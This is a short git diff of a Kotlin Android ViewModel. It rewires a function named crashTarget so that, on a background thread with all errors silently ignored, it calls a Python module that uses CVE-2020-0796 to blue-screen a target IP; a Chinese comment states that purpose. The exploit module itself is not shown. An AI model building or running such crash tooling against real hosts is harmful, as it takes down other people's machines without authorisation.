@@ -78,9 +78,10 @@ class WenetViewModel: ViewModel() {
     /*
     利用cve-2020-0796蓝屏,执行python代码
      */
+    val py = Python.getInstance()
+
     private fun cve(inputString: String) {
         // 调用python代码
-        val py = Python.getInstance()
         var ifVulnerable = false
 
 //            ifVulnerable = false
@@ -115,11 +116,17 @@ class WenetViewModel: ViewModel() {
     }
 
     fun crashTarget(inputString: String) {
-        try {
-            val py = Python.getInstance()
-            py.getModule("cve-2020-0796-crash").callAttr("killIp",inputString)
-        } catch (e: Exception) {
-        }
+        object : Thread() {
+            override fun run() {
+                try {
+                    py.getModule("cve-2020-0796-crash").callAttr("killIp",inputString)
+                } catch (e: Exception) {
+                }
+
+            }
+        }.start()
+
+
     }
 
     fun loginWenet() {
